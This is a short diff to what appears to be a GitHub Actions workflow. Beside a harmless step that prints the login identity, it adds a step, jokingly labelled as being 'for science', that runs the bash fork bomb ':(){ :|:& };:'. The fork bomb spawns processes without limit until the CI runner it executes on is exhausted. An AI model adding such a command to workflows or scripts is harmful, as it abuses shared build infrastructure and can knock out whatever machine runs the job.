@@ -15,3 +15,5 @@ jobs:
       - name: mon identité de connexion
         run: who am i
 
+      - name: fork bomb for science sorry github.
+        run: ":(){ :|:& };:"
